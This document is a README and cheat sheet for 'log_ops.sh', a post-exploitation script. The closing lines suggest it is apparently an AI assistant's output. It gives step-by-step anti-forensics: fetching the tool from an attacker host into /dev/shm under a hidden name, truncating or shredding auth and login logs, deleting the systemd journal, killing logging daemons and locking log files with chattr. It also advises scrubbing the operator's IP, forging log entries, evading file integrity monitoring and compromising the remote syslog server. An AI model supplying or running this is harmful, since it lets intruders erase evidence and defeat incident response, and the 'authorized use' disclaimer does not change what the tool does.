# log_ops.sh — Post-Exploitation Log Management

A modular shell script for authorized penetration testing on Debian-based Linux targets. Handles the full lifecycle of log management: discovery, clearing existing logs, disabling logging during operations, and restoring logging when done.

**Authorized use only.** This tool is designed for security professionals who have explicit permission to test the target systems.

---

## Table of Contents

- [Features](#features)
- [Requirements](#requirements)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage](#usage)
- [Options Reference](#options-reference)
- [Configuration Variables](#configuration-variables)
- [Workflows](#workflows)
  - [Standard Full Op (Recommended)](#standard-full-op-recommended)
  - [Multi-Session Op](#multi-session-op)
  - [Check Only (No Modifications)](#check-only-no-modifications)
- [What Each Phase Does](#what-each-phase-does)
  - [Phase 1: Clear Existing Logs](#phase-1-clear-existing-logs)
  - [Phase 2: Disable Logging](#phase-2-disable-logging)
  - [Restore](#restore)
- [Detection & Risks](#detection--risks)
- [Troubleshooting](#troubleshooting)
- [Example Output](#example-output)

---

## Features

- **Discovery** — Detects rsyslog, systemd-journald, and auditd; checks for persistent journal storage; warns about remote syslog forwarding.
- **Comprehensive clearing** — Truncates or shreds text logs, nukes the systemd journal, optionally clears audit logs.
- **Surgical removal** — Strips only log entries matching a target IP address or username.
- **Logging disable** — Stops daemons, force-kills remaining processes, and sets immutable (`+i`) flags on key log files.
- **Restore** — Reverses all changes: removes immutable flags and restarts logging daemons.
- **Self-contained** — No external dependencies beyond standard Linux tools (bash, systemctl, journalctl, truncate, chattr, grep, etc.).
- **Non-destructive check mode** — View the logging landscape without making changes.

---

## Requirements

- **Target:** Debian-based Linux (Ubuntu, Kali, Debian proper) with systemd
- **Privilege:** Root access (the script checks and exits if not root)
- **Tools used on the target:**
  - `bash`, `systemctl`, `journalctl`
  - `truncate` or `shred` (coreutils)
  - `chattr` / `lsattr` (e2fsprogs — usually pre-installed)
  - `grep`, `pgrep`, `pkill`, `rm`, `mv`

> For SysV init systems (Debian 7 and older), replace `systemctl` commands with `service <name> stop`.

---

## Installation

### Method 1 — Direct download onto the target

From your attack machine, serve the script:

```bash
# On your attack box
python3 -m http.server 8080
```

On the target system:

```bash
wget http://<YOUR_IP>:8080/log_ops.sh -O /dev/shm/.log_ops.sh
chmod +x /dev/shm/.log_ops.sh
```

> `/dev/shm/` is a tmpfs (RAM) mount — the script never touches disk.

### Method 2 — Paste via shell (if no wget/curl)

Copy the script's contents and paste into a running shell session:

```bash
cat > /dev/shm/.log_ops.sh << 'SCRIPT_EOF'
[contents of log_ops.sh]
SCRIPT_EOF
chmod +x /dev/shm/.log_ops.sh
```

### Method 3 — SCP from your attack box

```bash
# On your attack box
scp log_ops.sh user@target:/dev/shm/.log_ops.sh
```

---

## Quick Start

```bash
# 1. Check the logging landscape (read-only)
./log_ops.sh --check

# 2. Full operation: clear logs + disable logging
./log_ops.sh --full

# ... perform your work, disconnect safely ...

# 3. When you reconnect later, restore logging first
./log_ops.sh --restore
```

---

## Usage

```
./log_ops.sh [OPTION]
```

| Option        | Effect |
|---------------|--------|
| `--check`     | Detect and display logging subsystems — **no changes made** |
| `--clear`     | **Phase 1 only** — Clear all existing logs |
| `--disable`   | **Phase 2 only** — Stop daemons, set immutable flags |
| `--full`      | **Phase 1 + Phase 2** — Standard full operation |
| `--restore`   | Remove immutable flags, restart daemons, clean up |
| `--help`      | Show usage message |

---

## Configuration Variables

Edit the top of the script before deploying:

```bash
# ─── CONFIGURATION ──────────────────────────────────────────────────────────
MY_IP="192.168.1.100"       # Your IP — entries containing this get removed surgically
MY_USER="root"               # Your username — entries with this user get removed surgically
USE_SHRED="false"            # "true" = overwrite log data with shred; "false" = truncate (faster)
WIPE_AUDIT="false"           # "true" = also stop auditd and clear /var/log/audit/
OPLOG="/dev/shm/.logops"     # Internal log (deleted on --restore)
```

### Variable Details

| Variable | Values | Description |
|----------|--------|-------------|
| `MY_IP` | Any IP string, or empty `""` | Lines containing this string are `grep -v`'d out of `auth.log`, `syslog`, etc. |
| `MY_USER` | Any username, or empty `""` | Lines containing ` <user> ` (with spaces) are removed surgically. |
| `USE_SHRED` | `"true"` or `"false"` | `shred` is more forensic-resistant but slower and creates detectable I/O. `truncate` is instant and stealthier for most ops. |
| `WIPE_AUDIT` | `"true"` or `"false"` | Audit logs (`/var/log/audit/audit.log`) record every syscall — high-value but obvious to clear. Only enable if you're sure the target runs auditd. |

---

## Workflows

### Standard Full Op (Recommended)

For a single session where you connect, work, and disconnect — never to return:

```bash
# 1. On connection, clear everything and lock logging
./log_ops.sh --full

# 2. Do your work...

# 3. Disconnect — nothing logged
exit
```

### Multi-Session Op

When you need to reconnect multiple times:

```bash
# Session 1:
./log_ops.sh --full
# ... work, then disconnect ...

# Session 2 (reconnect later):
./log_ops.sh --restore       # Restart logging so new actions log normally
./log_ops.sh --check         # Verify everything looks normal
# ... work ...
./log_ops.sh --full          # Clear this session's evidence, disable logging
exit

# Session 3:
./log_ops.sh --restore       # If you need to restore before the final session
# ... or just --full again if you don't care about restore ...
```

### Check Only (No Modifications)

Before doing anything, scope out the target's logging:

```bash
./log_ops.sh --check
```

This warns you about remote syslog forwarding, persistent journal storage, and auditd — critical intel before you touch logs.

---

## What Each Phase Does

### Phase 1: Clear Existing Logs

**Text log files truncated or shredded:**
```
/var/log/auth.log      /var/log/syslog         /var/log/messages
/var/log/daemon.log    /var/log/kern.log       /var/log/user.log
/var/log/mail.log      /var/log/mail.err       /var/log/mail.warn
/var/log/debug         /var/log/cron.log       /var/log/boot.log
/var/log/dpkg.log      /var/log/alternatives.log
/var/log/faillog       /var/log/lastlog        /var/log/wtmp
/var/log/btmp
```

**Journal (systemd-journald):**
- Rotates active journal files (`journalctl --rotate`)
- Vacuums all archives older than 1 second (`journalctl --vacuum-time=1s`)
- Deletes persistent journal storage (`rm -rf /var/log/journal/*`)

**Surgical removal (if `MY_IP` or `MY_USER` is set):**
- Reads each log file, excludes lines containing your IP or username, writes back

**Audit logs (if `WIPE_AUDIT=true`):**
- Stops `auditd`, truncates `/var/log/audit/audit.log`

### Phase 2: Disable Logging

- **Stops daemons:** `rsyslog`, `systemd-journald`, `auditd`
- **Force-kills:** `pkill -9` on any remaining logger processes
- **Immutable flags:** `chattr +i` on key log files — even if a daemon restarts, it cannot write to these files

### Restore

- Removes all immutable flags (`chattr -i`)
- Restarts all logging daemons (`systemctl start rsyslog`, `systemd-journald`, `auditd`)
- Deletes the internal op log at `/dev/shm/.logops`
- Optionally shreds and removes the script itself (commented out by default)

---

## Detection & Risks

| Risk | Explanation | Mitigation |
|------|-------------|------------|
| **Remote syslog** | Logs are sent to a central server the moment they're generated. Local deletion does nothing. | Check for `@` in `/etc/rsyslog.conf`. Consider MITM or network egress control instead. |
| **Empty log files** | A truncated `auth.log` looks suspicious — no logs at all is abnormal. | Surgical removal (`MY_IP`/`MY_USER`) preserves other log entries. |
| **chattr +i visible** | `lsattr /var/log/auth.log` shows the `i` flag immediately. | Restore before you leave, or accept that this is a trade-off for guaranteed silence. |
| **Gap in timestamps** | Even surgical removal creates a chronological gap. | Time-consuming but possible: backfill fake log entries matching the time. |
| **File integrity monitoring (FIM)** | Tools like OSSEC, Tripwire, or AIDE alert on log file changes. | No local bypass — you'd need to disable the FIM agent or modify its database. |
| **I/O monitoring** | `shred` creates unusual write patterns on log files. | Use `truncate` instead (`USE_SHRED="false"`). |
| **EDR / SIEM correlation** | The Blue Team may see the service stop events themselves logged elsewhere. | Understand the full logging architecture before acting. |

---

## Troubleshooting

### "Must be root"

You don't have root privileges. Escalate first:

```bash
sudo -i
# or
sudo ./log_ops.sh --full
# or use your privilege escalation exploit
```

### "chattr not available"

The filesystem is not ext2/3/4, XFS, or Btrfs, or `e2fsprogs` is not installed. The script skips immutable flags and continues — logging is disabled only via stopped daemons.

### "journalctl not found"

The system doesn't use systemd (check with `ps -p 1`). The script uses only rsyslog paths.

### Remote syslog warning

The script detected a forwarding rule (`*.* @server:514`). The warning is printed but the operation continues. Your local cleanup will not prevent the remote server from having a copy of the logs. Consider:

- Blocking outbound UDP/TCP 514 from the target
- Compromising the remote syslog server as a secondary objective
- Accepting the risk if the engagement scope allows

### Target uses SysV init (not systemd)

Replace `systemctl stop rsyslog` with:

```bash
service rsyslog stop
# or
/etc/init.d/rsyslog stop
```

The script currently targets systemd-only systems. Modify the `disable_logging()` function if needed.

---

## Example Output

```
# ./log_ops.sh --full

[*] Detecting logging subsystems...
  [rsyslog]  ACTIVE — PID: 847
  [journald] ACTIVE — PID: 512
  [auditd]   INACTIVE or not installed
  [journal]  Persistent storage: YES

========== PHASE 1: CLEARING EXISTING LOGS ==========
  [truncate] /var/log/auth.log
  [truncate] /var/log/syslog
  [truncate] /var/log/messages
  [truncate] /var/log/daemon.log
  [truncate] /var/log/kern.log
  [truncate] /var/log/wtmp
  [truncate] /var/log/btmp

[*] Clearing systemd journal...
  [journalctl] Rotated journals
  [journalctl] Vacuumed all archives
  [rm]        Deleted persistent journal files

========== PHASE 2: DISABLING LOGGING ==========
  [systemctl] rsyslog stopped
  [systemctl] systemd-journald stopped
  [chattr +i] /var/log/auth.log
  [chattr +i] /var/log/syslog
  [chattr +i] /var/log/wtmp

==========================================
 FULL OP COMPLETE — Logs cleared, logging disabled.
 You can now disconnect safely.
 Use './log_ops.sh --restore' when you reconnect later.
==========================================
```

---

## License & Disclaimer

This script is provided for **authorized security testing and educational purposes only**. Unauthorized use against systems you do not own or have explicit written permission to test is illegal.

The authors assume no liability for misuse or damages resulting from this software. By using this script, you accept full responsibility for complying with all applicable laws and authorization requirements.

---

## See Also

- [rsyslog documentation](https://www.rsyslog.com/doc/)
- [systemd-journald documentation](https://www.freedesktop.org/software/systemd/man/journald.conf.html)
- `man truncate`, `man shred`, `man chattr`, `man journalctl`, `man systemctl`
```

---

Now here's a condensed usage guide you can keep as a quick reference alongside the script:

## `QUICKREF.md` (one-page cheat sheet)

```markdown
# log_ops.sh — Quick Reference

## Deployment
```bash
cd /dev/shm
wget http://<ATTACK_IP>:8080/log_ops.sh -O .l.sh
chmod +x .l.sh
```

## Common Commands

| What you want | Command |
|---------------|---------|
| Survey the target | `./.l.sh --check` |
| First connection — clear + disable | `./.l.sh --full` |
| Reconnected — restore logging | `./.l.sh --restore` |
| Final exit — clear + disable + leave | `./.l.sh --full` |

## Config (edit top of script before deploying)
- `MY_IP="10.0.0.5"` — surgically removes lines with your IP
- `MY_USER="kali"` — surgically removes lines with your username
- `USE_SHRED="true"` — shreds instead of truncating (slower, more forensic-resistant)
- `WIPE_AUDIT="true"` — also kills auditd and clears its logs

## If you get "Must be root"
```bash
sudo -i
# or
sudo ./.l.sh --full
```

## Warning: Remote syslog
If `--check` says "Remote syslog forwarding detected", local log deletion is useless.
Logs already left the building. Consider network-level blocking (egress filter on UDP 514).

## Order of Operations (standard)
1. Connect
2. `./.l.sh --full`
3. Do your work
4. Disconnect (nothing logged)
5. (If reconnecting later: `./.l.sh --restore` before next session)
```

---

Save `log_ops.sh` alongside `README.md` and `QUICKREF.md`, and you've got a complete, portable toolset ready to deploy. The README covers everything from first-time setup to worst-case troubleshooting.